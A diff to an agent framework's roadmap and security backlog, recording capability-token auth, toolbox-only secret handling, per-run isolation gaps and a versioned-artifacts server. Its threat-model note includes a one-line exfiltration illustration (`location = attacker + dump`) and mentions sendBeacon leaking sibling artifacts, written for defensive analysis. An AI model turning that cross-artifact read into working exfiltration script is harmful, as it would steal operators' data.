@@ -52,6 +52,23 @@ Inbound Outlook, Teams, and API traffic maps deterministically to the right agen
 
 CLI-managed control over what each agent_view can do: `tool:enable`/`tool:disable`, a skills module (`skill:sync/list/enable/disable`) backed by a registry, and pre-built materialized workspaces per agent_view (`workspace:build`) so the consumer copies a ready build instead of regenerating identical files on every run. Three independent deliverables, each disableable without breaking the system.
 
+### ✅ Versioned artifacts
+
+Generic versioned file/directory trees: mutable **drafts**, immutable **versions**, and an atomic
+**current** pointer, backed by local Git that never surfaces in the public contract. Shipped as the
+core module `versioned_artifacts` (eleven opt-in MCP tools covering the whole lifecycle, with
+`artifact:init` / `artifact:list` / `artifact:publish` as equivalent operator commands and
+`artifact:delete` as an operator-only one), with a toolbox-only storage volume, per-`agent_view`
+artifact allowlist, filesystem locking, crash recovery and a `versioned_artifact_audit` trail. A
+separate `artifacts` container serves the published tree on loopback, and disabling the module makes
+it answer 503. See
+[docs/modules/versioned-artifacts.md](docs/modules/versioned-artifacts.md). Deferred: garbage
+collection of Git objects (immutable versions and `audit-fallback.log` both grow without bound, though
+materialized previews have a retention policy on by default via `serving/keep_versions`, `10`),
+human-in-the-loop publication approval, an annotated tag object per version so a version carries its
+own label, and multiple toolbox instances per `storage_root` — which needs a real distributed lock,
+see DECISIONS.md.
+
 ### 🟡 Developer experience & open-source polish
 
 Getting a contributor from "I want to add a Slack integration" to a working module in under 30 minutes. The unified Python CLI, `doctor`, `init`, `make:module`, and `module:validate` are shipped; what remains is per-capability extension docs, architecture tests that enforce module boundaries in CI, and a log-safety audit before widening logging namespaces.
@@ -138,19 +155,15 @@ docker compose restart
 
 ### Security hardening backlog
 
-- **Toolbox-only secret boundary in Python bootstrap** — `bootstrap` transiently decrypts
-  DEFAULT-scope `obscure` config in the cron/consumer/CLI, so non-toolbox Python processes hold
-  decrypted secrets (contradicting "Toolbox = only container with secrets"). Design + scope in
+- **Toolbox-only secret boundary in Python bootstrap** — **PARTIALLY DELIVERED (2026-08-23).**
+  `bootstrap` still transiently decrypts DEFAULT-scope `obscure` config in the cron/consumer/CLI —
+  but **not** for a field declaring `access: "toolbox_only"`, which the Outlook Graph credentials
+  now do. What remains open is item 3 of the PRD: `app_monitor` consumes its obscure SMTP password
+  cron-side to send breach alerts, so it needs a toolbox transport before it can be marked the same
+  way. Design + scope in
   [docs/security/toolbox-only-secret-boundary.md](docs/security/toolbox-only-secret-boundary.md).
   Surfaced by the Outlook sender-routing review (2026-07-24) as pre-existing and out of scope for
   that feature.
-- **Per-field `toolbox_only` exclusion in the config resolver** — a field only the toolbox should ever
-  resolve is still resolved by `bootstrap()` from ENV (`framework/config_resolver.py:209`) for every
-  enabled module, *before* any module code can run, so the only remedy available to a module is to
-  refuse to operate (as `github`'s two-sided `env_guard` does on all four of its surfaces). Closing it
-  properly is a framework change: let `system.json` mark a field toolbox-only and have `resolve_field`
-  skip it outside the toolbox. Surfaced by the GitHub PR-review port (2026-08-14) as pre-existing and
-  accepted as a residual for that port (owner sign-off 2026-08-13).
 - ~~**A distinct OS uid per agent_view (Option B of D-SSH-1)**~~ — **cancelled 2026-09-23.**
   agent_views sharing `/workspace` files is a wanted property (it is how a task is handed from one
   view to another), so per-view uids are not going to be built. What Option B was carrying —
@@ -161,18 +174,34 @@ docker compose restart
   [docs/architecture/cron-privileges.md](docs/architecture/cron-privileges.md) and `DECISIONS.md`
   D-SSH-1. The peer-**artifact** reads Option B would also have closed remain open and accepted:
   one uid, one `/workspace`.
-- **Internal-caller auth for the toolbox (N5-2)** — `/sse` and `/mcp` take `agent_view_id` from the
-  query string with no caller authentication (`src/agento/toolbox/server.js:88,126`), and the `jira`,
-  `outlook`, `bitbucket` and `github` REST handlers take it from the request body. The fix is to bind
-  the view to an authenticated caller/session in `server.js` (e.g. a job-scoped token in the MCP URL
-  that `server.js` resolves `agent_view_id` from), applied **once for all four modules** — a
-  module-local fix would create a fourth pattern and protect nobody else. Re-confirmed by the GitHub
-  PR-review port (2026-08-14), which ships at parity with the other three (owner sign-off 2026-08-13).
+- **Per-run identity boundary for the sandbox (the segmentation half of the toolbox east-west work)**
+  — **OPEN.** Capability tokens stop a caller from *asking* for another view's scope, but every agent
+  process the consumer spawns runs as the same `agent` account and the cron container mounts the whole
+  workspace, so one concurrent run can read another run's live token out of its MCP config and
+  authenticate as that view. Directory-per-run is not an identity boundary and file modes cannot make
+  it one. Closing it needs a distinct UID per run or a container per run. Until then, concurrent runs
+  in one deployment are mutually trusting — documented in
+  [docs/architecture/zero-trust.md](docs/architecture/zero-trust.md).
+- **Per-field `toolbox_only` exclusion in the config resolver** — **DELIVERED (2026-08-23).**
+  `system.json` now carries `"access": "toolbox_only"` and `"allowEnv": false` per field. Python's
+  `resolve_field` returns `None` for a `toolbox_only` field, `ScopedConfigService.get()` raises on a
+  direct read, the bulk `resolve_all()` skips it, and `module:validate` fails a deploy that sets a
+  `CONFIG__*` override for an `allowEnv: false` field. Both resolvers (Python and toolbox JS) enforce
+  the same two keys. The `github` `env_guard` is no longer the only remedy.
+- **Internal-caller auth for the toolbox (N5-2)** — **capability half DELIVERED (2026-08-23); the
+  co-tenant half stays OPEN** (see the per-run identity boundary entry). Every MCP session and
+  every `/api` route now needs a **capability token**; the scope (`agent_view_id`, `job_id`) is read
+  from the `toolbox_capability` DB row, never from a query string or a request body. A caller may
+  still send `agent_view_id` in a body, but it is only ever compared with the capability's own scope —
+  a mismatch is refused. Applied once for all four modules, as the entry required. Rationale (why a
+  DB-backed capability and not a shared HMAC secret, and why network segmentation alone was rejected)
+  is in [DECISIONS.md](DECISIONS.md).
 
 ### Deprecation removals due in v0.17 or later
 
 | Shim | Where | Remove when |
 |---|---|---|
+| Legacy `aes256:` read path + the `core/RekeyToScrypt` data patch | `framework/crypto.py` (`decrypt` legacy branch, `is_legacy`), `toolbox/crypto.js`, `modules/core/src/patches/rekey_to_scrypt.py`, `modules/core/data_patch.json` | v0.18.0 — the patch ships in 0.17.0, so every deployment that upgraded has been rekeyed to `aes256s:`. Delete both legacy branches, `is_legacy`, the patch and its test, and the legacy-format bullet in `docs/config/encryption.md`. CodeQL alerts `py/weak-sensitive-data-hashing` / `js/insufficient-password-hash` were dismissed for this path and close with it |
 | `workspace:ssh-purge` command (+ its `wo:sp` shortcut) | `workspace_build/src/commands/ssh_purge.py`, `workspace_build/di.json` | every deployment has upgraded past the release that stopped writing `ssh_private_key` to disk and has run the sweep once. Nothing on this code writes a key file, so the command then has nothing to find. Delete the command, its `di.json` entry, its tests, and the doc sections in `docs/cli/workspace-build.md` / `docs/cli/README.md` / `docs/config/identity.md`; keep `find_private_keys` only if `workspace:build`'s own legacy pruning still uses it |
 
 ### Deprecation removals due next release (v0.16)
@@ -194,6 +223,26 @@ Each is a one-release compatibility shim; remove all of them together.
 | `_iter_module_dirs` shim | `framework/cli/_provisioning.py` | callers use `framework/module_discovery.py` |
 | Pre-0.15 `agent_view/provider`-as-harness fallback | `framework/agent_view_runtime._resolve_harness_and_provider` | keep until the data patch has demonstrably run everywhere; then delete the legacy branch |
 
+### No per-job isolation inside the consumer process (raised during AG-50)
+
+`consumer.py:204-206` runs jobs as threads in one process, and `run_preparation.py:153-162`
+puts each run's credential in the directory that is also its `HOME`. One job can therefore
+read another job's desk and another job's credential. Delegation — one agent scheduling
+work for another — makes concurrent jobs the normal case rather than the exception, so this
+moves from "theoretical" to "the default shape of a run".
+
+### `schedule_agent_job` needs framework support, not a module workaround (raised during AG-50)
+
+Scheduling a job for *another* agent needs a `job.type` widening plus an opened `AgentType`
+(`framework/job_models.py:17-21`, `bootstrap.py:255`), and `publisher.publish()` must learn
+`context` and `parent_id` (`publisher.py:84-93` writes neither). A module that
+re-implements dedupe-then-insert against the `job` table instead is a second write path to
+the queue.
+
+**`schedule_followup` must not be widened to cover this.** Its idempotency key
+`followup:{source}:{reference_id}:{minute}` (`schedule.js:91`) collapses a two-agent
+fan-out in the same minute into one job — and reports success.
+
 ### Ungated Toolbox REST endpoints (raised during the Pi harness work)
 
 `registerModuleRestApis` registers `POST /api/jira/request`, `/api/jira/search`,
@@ -206,3 +255,60 @@ bypass the `is_enabled` allow-list that governs every MCP tool.
 Not caused by the Pi work and deliberately out of its scope, but it is a real gap in the
 opt-in tool model and wants its own decision: either gate them behind `isToolEnabled` like
 the MCP tools, or remove them if the MCP path has superseded them.
+
+**Raised again by AG-50 (`versioned_artifacts`):** agent_view identity on that listener is
+**self-asserted** — `src/agento/toolbox/server.js:95` reads `agent_view_id` from a query
+parameter supplied by a config file that lives in the job's own writable artifacts
+directory. That makes it the ceiling on every per-agent_view gate, `allowed_artifacts`
+included: a job that edits its own config can present any agent_view it likes. The fix is
+session-bound identity in the framework, never a module-local caller check.
+
+**Widened by the AG-50 follow-up** that gives the agent the whole artifact lifecycle: the
+`owner` marker `init` writes beside each artifact records that same self-asserted
+value, so it SCOPES cooperating views and does not authorize them — a forged id reaches
+another view's artifacts and its per-view creation quota. Shipping it this way was the
+deliberate choice (the alternative markers are all forgeable through the same parameter);
+what closes it is the session-bound identity above, and nothing below it.
+
+Two more gaps the same change makes reachable without an operator, neither of them new:
+- **Nothing bounds disk.** `limits/max_agent_artifacts` bounds artifact count. Versions are
+  unbounded, every save materializes a full copy into the published tree, and
+  `serving/keep_versions` now defaults to `10`, which bounds the previews per artifact but not
+  the store: immutable versions still accumulate forever. The rest belongs with the GC deferral
+  in the Versioned artifacts milestone.
+- ~~**No `artifact:delete` exists**, so the creation cap is a one-way ratchet.~~ **Shipped
+  2026-09-15** — `artifact:delete` removes both roots and the row under the init lock, CLI only.
+  The cap is still a lockout of every other view until an operator runs it.
+
+Also unclosed on the serving side: `artifacts-server.js` answers `/` with an index of every
+artifact code, and agent-authored HTML now reaches that port with no operator step. Same-origin
+script in one artifact can therefore enumerate and read every other artifact in the operator's
+browser, and `navigator.sendBeacon` carries it out — the operator's browser is the one route
+off that container. `X-Content-Type-Options: nosniff` shipped with the lifecycle change; the
+same-origin read did not. Restricting the `/` index instead needs per-caller identity the
+server deliberately does not have, and the compose healthcheck fetches `/` and expects it to
+answer.
+
+**Analysed 2026-09-15, deliberately not shipped.** A `Content-Security-Policy: sandbox
+allow-scripts` header does close the sibling read — the page gets an opaque origin, so the
+`/` index tells it nothing it can then fetch. It has two costs that make it the wrong default:
+
+- `<script type="module">` and `@font-face url()` are **CORS-mode** fetches. From an opaque
+  origin they need an `access-control-allow-origin` the server does not send, so they fail
+  **silently** — a blank page and nothing in the terminal. Every Vite build and every
+  self-hosted-font site breaks that way, which is the use case the lifecycle change exists
+  for. Classic `<script src>`, `<link rel=stylesheet>` and `<img>` are `no-cors` and still
+  load, so a plain static site is fine. Adding `access-control-allow-origin: *` fixes the
+  module scripts and reopens the sibling reads — on one origin, same-origin data and sibling
+  data are one capability.
+- `sandbox` does not stop top-level self-navigation: `location = attacker + dump` still runs.
+  The win is only that `dump` cannot hold a sibling artifact.
+
+There was also no place to put the switch: the `artifacts` container carries no `env_file:`,
+no `environment:` and no database by design, so a `serving/csp` config key is unreachable
+there. The header would have to be hardcoded.
+
+The fix that costs nothing at runtime is **one origin per artifact** — route by `Host`
+(`<code>.localhost:8080`), so each artifact keeps full same-origin capability and the browser
+itself denies the cross-artifact read. It changes `preview_url`, and Safari does not resolve
+`*.localhost` while Chrome and Firefox do. Decide before the port ever leaves loopback.
